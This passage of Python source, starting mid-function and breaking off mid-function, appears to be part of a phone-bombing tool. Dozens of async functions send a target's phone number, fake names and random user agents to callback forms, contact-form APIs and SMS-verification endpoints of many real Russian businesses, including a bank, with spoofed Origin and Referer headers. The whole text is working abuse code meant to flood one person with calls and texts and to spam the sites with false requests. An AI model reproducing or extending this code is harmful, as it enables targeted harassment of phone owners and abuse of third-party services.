    d = {"name":rn(),"phone":p["digits_7"],"message":"Заказ звонка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://volgograd.barssport-factory.ru","Referer":"https://volgograd.barssport-factory.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_florens(s, p):
    url = "https://volgograd.florens.group/thanks/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://volgograd.florens.group","Referer":"https://volgograd.florens.group/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_kupitzabor_cf7(s, p):
    url = "https://volgograd.kupitzabor.ru/wp-json/contact-form-7/v1/contact-forms/3254/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Заказ забора"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://volgograd.kupitzabor.ru","Referer":"https://volgograd.kupitzabor.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_m300(s, p):
    url = "https://volgograd.m-300.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://volgograd.m-300.ru","Referer":"https://volgograd.m-300.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_zabor_company(s, p):
    url = "https://volgograd.zabor-company.ru/ajax/form_send.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://volgograd.zabor-company.ru","Referer":"https://volgograd.zabor-company.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stroitelstvo_volgograd(s, p):
    url = "https://stroitelstvo-volgograd.ru/ajax_send.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Строительство"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://stroitelstvo-volgograd.ru","Referer":"https://stroitelstvo-volgograd.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_barko(s, p):
    url = "https://volgograd.barko.pro/bitrix/templates/barko/include/form/form.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://volgograd.barko.pro","Referer":"https://volgograd.barko.pro/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_zakaz_zaborov(s, p):
    url = "https://volgograd.zakaz-zaborov.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://volgograd.zakaz-zaborov.ru","Referer":"https://volgograd.zakaz-zaborov.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tara_zabor_profi(s, p):
    url = "https://tara.zabor-profi.ru/includes/callback.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tara.zabor-profi.ru","Referer":"https://tara.zabor-profi.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_zabory_v_volgograde(s, p):
    url = "https://zabory-v-volgograde.ru/action.php"
    d = {"phone":p["raw"],"name":rn(),"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://zabory-v-volgograde.ru","Referer":"https://zabory-v-volgograde.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn80aaaf5bhuqqcgf4j(s, p):
    url = "https://xn--80aaaf5bhuqqcgf4j.xn--p1ai/discount.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://xn--80aaaf5bhuqqcgf4j.xn--p1ai","Referer":"https://xn--80aaaf5bhuqqcgf4j.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lipetsk_smarteco(s, p):
    url = "https://lipetsk.smarteco.ru/wp-content/themes/storefront/form/sendemail.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lipetsk.smarteco.ru","Referer":"https://lipetsk.smarteco.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_flash48(s, p):
    url = "https://flash48.ru/php/send.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://flash48.ru","Referer":"https://flash48.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stogrand48(s, p):
    url = "https://stogrand48.ru/uslugi/"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://stogrand48.ru","Referer":"https://stogrand48.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ldr48_cf7(s, p):
    url = "https://ldr48.ru/wp-json/contact-form-7/v1/contact-forms/113/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Заказ звонка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://ldr48.ru","Referer":"https://ldr48.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_viraj48(s, p):
    url = "https://viraj48.ru/mail.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://viraj48.ru","Referer":"https://viraj48.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_odsk_lip_api(s, p):
    url = "https://odsk-lip.ru/api/form/1/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://odsk-lip.ru","Referer":"https://odsk-lip.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ddxfitness_api(s, p):
    url = "https://www.ddxfitness.ru/api/sales-requests/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://www.ddxfitness.ru","Referer":"https://www.ddxfitness.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_polyclinika_ajax(s, p):
    url = "https://polyclinika.ru/local/components/Itech/feedback.order/ajax.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://polyclinika.ru","Referer":"https://polyclinika.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_cifra_bank_sms(s, p):
    url = f"https://cifra-bank.ru/ajax/presendSms.php?phone={p['plus_7']}"
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://cifra-bank.ru","Referer":"https://cifra-bank.ru/"}
    async with s.get(url, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pinskdrev_recall(s, p):
    url = "https://pinskdrev.ru/site/recall/"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pinskdrev.ru","Referer":"https://pinskdrev.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_wood_brus_recall(s, p):
    url = "https://wood-brus.ru/frmRecall.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://wood-brus.ru","Referer":"https://wood-brus.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_marya_sms(s, p):
    url = "https://www.marya.ru/bitrix/services/main/ajax.php?mode=class&c=oip%3Aum.json&action=isSMS"
    d = {"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://www.marya.ru","Referer":"https://www.marya.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_jetour_mclipetsk_cf7(s, p):
    url = "https://jetour-mclipetsk.ru/wp-json/contact-form-7/v1/contact-forms/79/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Запись на тест-драйв"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://jetour-mclipetsk.ru","Referer":"https://jetour-mclipetsk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bigmebel_lipetsk_ajax(s, p):
    url = "https://bigmebel-lipetsk.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://bigmebel-lipetsk.ru","Referer":"https://bigmebel-lipetsk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mango_office_19273(s, p):
    url = "https://mcw.mango-office.ru/multichannel/19273/orderCallback"
    d = {"name":rn(),"phone":p["digits_7"],"callTime":"Сейчас"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://mango-office.ru","Referer":"https://mango-office.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lipeck_zovofficial(s, p):
    url = "https://lipeck.zovofficial.com/index.php?route=extension/module/main_form/send"
    d = {"name":rn(),"phone":p["formatted"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lipeck.zovofficial.com","Referer":"https://lipeck.zovofficial.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_norditpro(s, p):
    url = "https://norditpro.ru/post/index"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://norditpro.ru","Referer":"https://norditpro.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_anriko48_chronoform(s, p):
    url = "https://www.anriko48.ru/zakazat-zvonok?view=form&tmpl=component&chronoform=zvonok2&event=submit"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.anriko48.ru","Referer":"https://www.anriko48.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lipetsk_malo_mesta(s, p):
    url = "https://lipetsk.malo-mesta.ru/forms/send_ajax/284ec833c48df7aa8b6a6355878d9acb1d87c9e4c0632f0a746ba8528033308d4bbdbeed13acad2d369be246225cdd104a69dba9471289dc1b6d50711b420e8e"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lipetsk.malo-mesta.ru","Referer":"https://lipetsk.malo-mesta.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tride_mebel_chronoform(s, p):
    url = "https://tride-mebel.ru/zakazat-zamer?view=form&chronoform=zvonok&event=submit"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tride-mebel.ru","Referer":"https://tride-mebel.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_glebbor_mailer(s, p):
    url = "https://glebbor.ru/mailer/cta/"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://glebbor.ru","Referer":"https://glebbor.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_1mebel_room_netcat(s, p):
    url = "https://1mebel-room.ru/netcat/modules/default/forms.inc.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://1mebel-room.ru","Referer":"https://1mebel-room.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lipetsk_bestmebelshop(s, p):
    url = "https://www.lipetsk.bestmebelshop.ru/bitrix/components/mattweb/callback_2/script/senddata.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.lipetsk.bestmebelshop.ru","Referer":"https://www.lipetsk.bestmebelshop.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lipeck_buryakof(s, p):
    url = "https://lipeck.buryakof.ru/forms/default/call-back-v"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lipeck.buryakof.ru","Referer":"https://lipeck.buryakof.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lipetsk_s5r(s, p):
    url = "https://lipetsk.s5r.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lipetsk.s5r.ru","Referer":"https://lipetsk.s5r.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lipeck_korona_remont(s, p):
    url = "https://lipeck.korona-remont.ru/forma"
    d = {"phone":p["digits_7"],"name":rn(),"comment":"Ремонт"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lipeck.korona-remont.ru","Referer":"https://lipeck.korona-remont.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dverineva_petrozavodsk(s, p):
    url = "https://dverineva-petrozavodsk.ru/ajax/send_remont.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Ремонт"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://dverineva-petrozavodsk.ru","Referer":"https://dverineva-petrozavodsk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sampo_stroy(s, p):
    url = "https://sampo-stroy.ru/mail/?upsession=up1_w8lP1Wh4EX"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Строительство"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://sampo-stroy.ru","Referer":"https://sampo-stroy.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_sluzhba_remonta(s, p):
    url = "https://petrozavodsk.sluzhba-remonta.ru/feedback"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.sluzhba-remonta.ru","Referer":"https://petrozavodsk.sluzhba-remonta.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_vse_podklyuch(s, p):
    url = "https://petrozavodsk.vse-podklyuch.ru/netcat/add.php"
    d = {"catalogue":"1","sub":"78","cc":"120","posting":"1","TypeMes":"Заказ звонка","f_Name":rn(),"f_Phone":p["raw"],"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.vse-podklyuch.ru","Referer":"https://petrozavodsk.vse-podklyuch.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_expert123(s, p):
    url = "https://petrozavodsk.expert123.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://petrozavodsk.expert123.ru","Referer":"https://petrozavodsk.expert123.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_innstroy(s, p):
    url = "https://petrozavodsk.innstroy.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.innstroy.ru","Referer":"https://petrozavodsk.innstroy.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_elektrikpetrozavodsk_cf7(s, p):
    url = "https://elektrikpetrozavodsk.ru/wp-json/contact-form-7/v1/contact-forms/1679/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен электрик"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://elektrikpetrozavodsk.ru","Referer":"https://elektrikpetrozavodsk.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sevist_form(s, p):
    url = "https://sevist.ru/?id=1&template=.default&page=forms.get&page-mode=Y"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"FORM_CALL"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://sevist.ru","Referer":"https://sevist.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vodaonline_callback(s, p):
    url = "https://www.vodaonline.ru/local/templates/main/ajax/callback.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://www.vodaonline.ru","Referer":"https://www.vodaonline.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_waterline_dostavka(s, p):
    url = "https://www.waterline-dostavka-vody.ru/app/c"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Доставка воды"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.waterline-dostavka-vody.ru","Referer":"https://www.waterline-dostavka-vody.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_aelita_water_ajax(s, p):
    url = "https://www.aelita-water.ru/index.php?option=com_ajax&module=simplecallback&format=json"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://www.aelita-water.ru","Referer":"https://www.aelita-water.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ooospatium_bitrix(s, p):
    url = "https://ooospatium.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://ooospatium.bitrix24.ru","Referer":"https://ooospatium.bitrix24.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pyrus_form(s, p):
    url = "https://pyrus.com/Services/ClientServiceV2.svc/CreateExternalForm"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://pyrus.com","Referer":"https://pyrus.com/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_svoy_pitomnik(s, p):
    url = "https://petrozavodsk.svoy-pitomnik.ru/forms/zvonok.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.svoy-pitomnik.ru","Referer":"https://petrozavodsk.svoy-pitomnik.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_gor_master(s, p):
    url = "https://petrozavodsk.gor-master.ru/order/create"
    d = {"name":rn(),"phone":p["digits_7"],"service":random.choice(SERV),"address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.gor-master.ru","Referer":"https://petrozavodsk.gor-master.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mattuhouse_form(s, p):
    url = "https://mattuhouse.ru/app/4.4/form"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mattuhouse.ru","Referer":"https://mattuhouse.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_detskaya_ploshadka(s, p):
    url = "https://petrozavodsk.detskaya-ploshadka-dacha.ru/netcat/add.php?template=98"
    d = {"catalogue":"1","sub":"78","cc":"120","posting":"1","TypeMes":"Заказ звонка","f_Name":rn(),"f_Phone":p["raw"],"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.detskaya-ploshadka-dacha.ru","Referer":"https://petrozavodsk.detskaya-ploshadka-dacha.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_dmastera_cf7_v2(s, p):
    url = "https://petrozavodsk.d-mastera.ru/wp-json/contact-form-7/v1/contact-forms/4/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен мастер"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.d-mastera.ru","Referer":"https://petrozavodsk.d-mastera.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_kamprok(s, p):
    url = "https://petrozavodsk.kamprok.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.kamprok.ru","Referer":"https://petrozavodsk.kamprok.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_tribuketa(s, p):
    url = "https://petrozavodsk.tribuketa.ru/wp-admin/admin-ajax.php?0.8740683375461771"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://petrozavodsk.tribuketa.ru","Referer":"https://petrozavodsk.tribuketa.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_petrozavodsk_topsadovnik(s, p):
    url = "https://petrozavodsk.topsadovnik.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://petrozavodsk.topsadovnik.ru","Referer":"https://petrozavodsk.topsadovnik.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_autokod36_callback(s, p):
    url = "https://www.autokod36.ru/index.php/obratniy-zvonok"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.autokod36.ru","Referer":"https://www.autokod36.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mechanika_pro_chronoform(s, p):
    url = "https://mechanika.pro/?chronoform=callback&event=submit"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mechanika.pro","Referer":"https://mechanika.pro/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vyezdservice36_cf7(s, p):
    url = "https://vyezdservice36.ru/wp-json/contact-form-7/v1/contact-forms/8/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен сервис"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://vyezdservice36.ru","Referer":"https://vyezdservice36.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bibi_ru_api(s, p):
    url = "https://bi-bi.ru/api/v1/lead/requests/callback/guest"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://bi-bi.ru","Referer":"https://bi-bi.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_li_auto_voronezh_ajax(s, p):
    url = "https://li-auto-voronezh.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://li-auto-voronezh.ru","Referer":"https://li-auto-voronezh.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_voronezh_baikalsr_bitrix(s, p):
    url = "https://voronezh.baikalsr.ru/bitrix/services/main/ajax.php?mode=class&c=baikalsr%3Aform&action=send"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://voronezh.baikalsr.ru","Referer":"https://voronezh.baikalsr.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_voronezh_garantstroikompleks(s, p):
    url = "https://voronezh.garantstroikompleks.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://voronezh.garantstroikompleks.ru","Referer":"https://voronezh.garantstroikompleks.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vag_avtomir_vrn_api(s, p):
    url = "https://vag-avtomir-vrn.ru/api/requests/"
    d = {"name":rn(),"phone":p["digits_7"],"brand":random.choice(CAR_B),"model":random.choice(CAR_M)}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://vag-avtomir-vrn.ru","Referer":"https://vag-avtomir-vrn.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ivartauto_callback(s, p):
    url = "https://ivartauto.ru/callback_orders"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://ivartauto.ru","Referer":"https://ivartauto.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_kia_freshauto_ajax(s, p):
    url = "https://kia-freshauto.ru/ajax/requests/callback"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://kia-freshauto.ru","Referer":"https://kia-freshauto.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_voronezh_avtohous_form(s, p):
    url = "https://voronezh-avtohous.ru/form/2"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://voronezh-avtohous.ru","Referer":"https://voronezh-avtohous.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_avatr_voronezh_ajax(s, p):
    url = "https://avatr-voronezh.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://avatr-voronezh.ru","Referer":"https://avatr-voronezh.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_renault_voronezh_callme(s, p):
    url = "https://renault-voronezh.com/call_me"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://renault-voronezh.com","Referer":"https://renault-voronezh.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_edem36_contact(s, p):
    url = "https://edem36.ru/contact__1me.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://edem36.ru","Referer":"https://edem36.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ritual_36_ajax(s, p):
    url = "https://ritual-36.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
